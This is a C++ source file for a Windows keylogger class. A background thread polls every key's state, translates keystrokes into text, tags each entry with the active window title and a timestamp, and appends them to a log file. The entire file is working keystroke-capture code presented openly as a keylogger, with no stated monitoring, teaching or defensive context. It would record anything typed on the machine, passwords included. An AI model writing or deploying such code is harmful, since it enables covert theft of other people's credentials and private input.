#include "Keylogger.h"
#include <fstream>
#include <sstream>
#include <ctime>
#include <string>
#include <vector>
#include <thread>
#include <atomic>
#include <mutex>

Keylogger& Keylogger::get()
{
    static Keylogger instance;
    return instance;
}

Keylogger::Keylogger()
{
    memset(m_prevKeyStates, 0, sizeof(m_prevKeyStates));
}

Keylogger::~Keylogger()
{
    stop();
}

void Keylogger::start()
{
    if (m_isRunning) return;

    m_isRunning = true;
    m_stopFlag = false;
    m_currentWindow = getForegroundWindowTitle();
    m_keyBuffer.clear();
    m_lastTimestamp = getCurrentTimestamp();
    memset(m_prevKeyStates, 0, sizeof(m_prevKeyStates));
    m_logBuffer.clear();

    std::ofstream ofs(m_logFilePath, std::ios::trunc);
    ofs.close();

    m_pollThread = std::thread(&Keylogger::pollingThread, this);
}

void Keylogger::stop()
{
    if (!m_isRunning) return;

    m_stopFlag = true;
    m_isRunning = false;

    if (m_pollThread.joinable()) {
        m_pollThread.join();
    }

    flushToBuffer();
}

void Keylogger::setLogFile(const wchar_t* logFilePath)
{
    if (logFilePath) {
        m_logFilePath = logFilePath;
    }
}

void Keylogger::clearLog()
{
    std::ofstream ofs(m_logFilePath, std::ios::trunc);
    ofs.close();

    std::lock_guard<std::mutex> lock(m_bufferMutex);
    m_logBuffer.clear();
}

const wchar_t* Keylogger::getLog()
{
    static std::wstring content;

    std::ifstream ifs(m_logFilePath);
    if (!ifs) {
        content = L"";
        return content.c_str();
    }

    std::string str((std::istreambuf_iterator<char>(ifs)),
                     std::istreambuf_iterator<char>());
    ifs.close();

    content.assign(str.begin(), str.end());
    return content.c_str();
}

const wchar_t* Keylogger::getBuffer()
{
    static std::wstring content;

    std::lock_guard<std::mutex> lock(m_bufferMutex);

    if (m_logBuffer.empty()) {
        content = L"";
        return content.c_str();
    }

    std::string result;
    for (const auto& entry : m_logBuffer) {
        result += entry.timestamp + " | " +
                  std::string(entry.window.begin(), entry.window.end()) + " | " +
                  entry.content + "\n";
    }

    content.assign(result.begin(), result.end());
    return content.c_str();
}

bool Keylogger::isRunning()
{
    return m_isRunning;
}

void Keylogger::flushBuffer(const wchar_t* logPath)
{
    std::lock_guard<std::mutex> lock(m_bufferMutex);

    if (m_logBuffer.empty()) return;

    std::wstring targetPath = logPath ? std::wstring(logPath) : m_logFilePath;

    std::ofstream ofs(targetPath, std::ios::app);
    if (ofs) {
        for (const auto& entry : m_logBuffer) {
            ofs << entry.timestamp << " | "
                << std::string(entry.window.begin(), entry.window.end()) << " | "
                << entry.content << "\n";
        }
        ofs.flush();
        ofs.close();
    }

    m_logBuffer.clear();
}

void Keylogger::clearBuffer()
{
    std::lock_guard<std::mutex> lock(m_bufferMutex);
    m_logBuffer.clear();
}

int Keylogger::getBufferSize()
{
    std::lock_guard<std::mutex> lock(m_bufferMutex);
    return static_cast<int>(m_logBuffer.size());
}

std::string Keylogger::getCurrentTimestamp()
{
    auto now = std::time(nullptr);
    std::tm tmBuf;
    localtime_s(&tmBuf, &now);
    char buf[32];
    std::strftime(buf, sizeof(buf), "[%Y-%m-%d %H:%M:%S]", &tmBuf);
    return std::string(buf);
}

std::wstring Keylogger::getForegroundWindowTitle()
{
    HWND hwnd = GetForegroundWindow();
    if (!hwnd) return L"";

    wchar_t title[512] = {};
    GetWindowTextW(hwnd, title, 512);

    return std::wstring(title);
}

std::string Keylogger::vkToString(int vk, bool shift)
{
    switch (vk) {
    case VK_BACK:    return "[BACK]";
    case VK_TAB:     return "[TAB]";
    case VK_RETURN:  return "[ENTER]";
    case VK_ESCAPE:  return "[ESC]";
    case VK_SPACE:   return " ";
    case VK_END:     return "[END]";
    case VK_HOME:    return "[HOME]";
    case VK_LEFT:    return "[LEFT]";
    case VK_UP:      return "[UP]";
    case VK_RIGHT:   return "[RIGHT]";
    case VK_DOWN:    return "[DOWN]";
    case VK_INSERT:  return "[INS]";
    case VK_DELETE:  return "[DEL]";
    case VK_SNAPSHOT: return "[PRTSCR]";
    case VK_F1:      return "[F1]";
    case VK_F2:      return "[F2]";
    case VK_F3:      return "[F3]";
    case VK_F4:      return "[F4]";
    case VK_F5:      return "[F5]";
    case VK_F6:      return "[F6]";
    case VK_F7:      return "[F7]";
    case VK_F8:      return "[F8]";
    case VK_F9:      return "[F9]";
    case VK_F10:     return "[F10]";
    case VK_F11:     return "[F11]";
    case VK_F12:     return "[F12]";
    case VK_LSHIFT:
    case VK_RSHIFT:
    case VK_LCONTROL:
    case VK_RCONTROL:
    case VK_LMENU:
    case VK_RMENU:   return "";
    case VK_CAPITAL: return "[CAPS]";
    case VK_NUMLOCK: return "[NUMLOCK]";
    case VK_SCROLL:  return "[SCROLL]";
    case VK_LWIN:
    case VK_RWIN:    return "[WIN]";
    case VK_APPS:    return "[MENU]";
    default:
        if (vk >= 0x30 && vk <= 0x39) {
            if (shift) {
                const char numShift[] = { ')', '!', '@', '#', '$', '%', '^', '&', '*', '(' };
                return std::string(1, numShift[vk - 0x30]);
            }
            return std::string(1, static_cast<char>(vk));
        }
        if (vk >= 0x41 && vk <= 0x5A) {
            char c = static_cast<char>(vk + 32);
            if (shift) c = static_cast<char>(vk);
            return std::string(1, c);
        }
        if (vk >= 0x60 && vk <= 0x69) {
            char num = static_cast<char>('0' + (vk - 0x60));
            return std::string(1, num);
        }
        if (vk >= 0x6A && vk <= 0x6F) {
            const char* ops[] = { "*", "+", ",", "-", ".", "/" };
            return std::string(ops[vk - 0x6A]);
        }
        break;
    }
    return "";
}

void Keylogger::flushToBuffer()
{
    if (!m_keyBuffer.empty()) {
        LogEntry entry;
        entry.timestamp = m_lastTimestamp;
        entry.window = m_currentWindow;
        entry.content = m_keyBuffer;

        std::lock_guard<std::mutex> lock(m_bufferMutex);
        m_logBuffer.push_back(entry);

        m_keyBuffer.clear();
    }
}

void Keylogger::checkWindowChange()
{
    std::wstring newWindow = getForegroundWindowTitle();
    if (newWindow != m_currentWindow && !newWindow.empty()) {
        flushToBuffer();
        m_currentWindow = newWindow;
        m_lastTimestamp = getCurrentTimestamp();
    }
}

void Keylogger::pollingThread()
{
    while (!m_stopFlag) {
        checkWindowChange();

        bool shiftPressed = (GetAsyncKeyState(VK_SHIFT) & 0x8000) != 0;

        for (int vk = 0; vk < 256; ++vk) {
            bool isDown = (GetAsyncKeyState(vk) & 0x8000) != 0;

            if (isDown && !m_prevKeyStates[vk]) {
                if (vk >= 0x30 && vk <= 0x5A) {
                    m_keyBuffer += vkToString(vk, shiftPressed);
                }
                else {
                    std::string special = vkToString(vk, shiftPressed);
                    if (!special.empty()) {
                        if (vk == VK_RETURN) {
                            m_keyBuffer += special;
                            flushToBuffer();
                        }
                        else {
                            m_keyBuffer += special;
                        }
                    }
                }
            }

            m_prevKeyStates[vk] = isDown;
        }

        std::this_thread::sleep_for(std::chrono::milliseconds(10));
    }

    flushToBuffer();
}
